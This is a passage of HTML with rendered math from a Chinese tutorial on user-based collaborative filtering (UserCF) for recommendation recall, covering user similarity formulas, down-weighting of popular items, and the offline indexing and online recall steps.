class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span></span></p><p>根据上述公式计算的结果如下，表示左边用户对右边物品的兴趣。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.9</mn><mo>×</mo><mn>0</mn><mo>+</mo><mn>0.7</mn><mo>×</mo><mn>1</mn><mo>+</mo><mn>0.7</mn><mo>×</mo><mn>3</mn><mo>+</mo><mn>0.4</mn><mo>×</mo><mn>0</mn><mo>=</mo><mn>2.8</mn></mrow><annotation encoding="application/x-tex">0.9 \times 0+0.7 \times 1+0.7 \times 3+0.4 \times 0 = 2.8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">8</span></span></span></span></span></p><h2 id="3-2-用户之间的相似度">3.2 用户之间的相似度</h2><blockquote><p>两个用户不相似：喜欢的物品没有重合</p></blockquote><p><img src="image_X-Q_f_8YFo.png" alt=""></p><blockquote><p>两个用户相似：喜欢的物品有重合</p></blockquote><p><img src="image_6zG73OGyFP.png" alt=""></p><h3 id="3-2-1-计算用户相似度">3.2.1 计算用户相似度</h3><p>喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathcal{J}\_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span></span></span></span>，喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的用户记作集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">\mathcal{J}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>，定义交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo>=</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">I=\mathcal{J}\_{1} \cap \mathcal{J}\_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span></span></span></span>。定义两个用户的重合度：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∣</mi><mi>I</mi><mi mathvariant="normal">∣</mi></mrow><msqrt><mrow><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo fence="true">∣</mo></mrow><mo>⋅</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(u_{1}, u_{2}\right)=\frac{|I|}{\sqrt{\left|\mathcal{J}\_{1}\right| \cdot\left|\mathcal{J}\_{2}\right|}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.157em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.243985em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2039849999999994em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5960150000000002em;"><span></span></span></span></span></span></span></span><span style="top:-3.473985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.920985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord">∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="3-2-2-降低热门物品权重">3.2.2 降低热门物品权重</h3><p>越热门的物品，对于计算用户相似度是没有价值的。反过来，重合的物品越冷门，说明两个人兴趣更加相似。所以需要降低热门物品的权重。</p><p>修改相似度计算公式如下：</p><blockquote><p>为什么这里要用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">log</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span> 呢？</p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><munder><mo>∑</mo><mrow><mi>l</mi><mo>∈</mo><mi>I</mi></mrow></munder><mfrac><mn>1</mn><mrow><mi>log</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>+</mo><msub><mi>n</mi><mi>l</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><msqrt><mrow><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo fence="true">∣</mo></mrow><mo>⋅</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(u_{1}, u_{2}\right)=\frac{\sum_{l \in I} \frac{1}{\log \left(1+n_{l}\right)}}{\sqrt{\left|\mathcal{J}\_{1}\right| \cdot\left|\mathcal{J}\_{2}\right|}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.4851080000000003em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.755108em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.243985em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2039849999999994em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5960150000000002em;"><span></span></span></span></span></span></span></span><span style="top:-3.473985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-4.1539850000000005em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.18639799999999984em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32708000000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mtight">l</span><span class="mtight">o</span><span class="mtight" style="margin-right:0.01389em;">g</span></span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">n_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ：喜欢物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span> 的用户数量，反映物品的热门程度</li></ul><h2 id="3-3-usercf完整召回流程">3.3 UserCF完整召回流程</h2><h3 id="3-3-1-事先做离线计算">3.3.1 事先做离线计算</h3><p><strong>建⽴“用户 → 物品”的索引</strong>：</p><ul><li>记录每个用户最近点击、交互过的物品 ID</li><li>给定任意用户 ID，可以找到他近期感兴趣的物品列表</li></ul><p><img src="image_ch8L7Vpfu5.png" alt=""></p><p><strong>建⽴“用户 → 用户”的索引</strong>：</p><ul><li>对于每个用户，索引他最相似的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个用户</li><li>给定任意用户 ID，可以快速找到他最相似的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个用户</li></ul><p><img src="image_Hk8aaNPO5z.png" alt=""></p><h3 id="3-3-2-线上做召回">3.3.2 线上做召回</h3><ol><li>给定用户 ID，通过“用户 → 用户”索引，找到 top-k 相似用户</li><li>对于每个 top-k 相似用户，通过“用户 → 物品”索引，找到用户近期感兴趣的物品列表（last-n）</li><li>对于取回的 <span class="katex"><span class="katex-mathml"><math 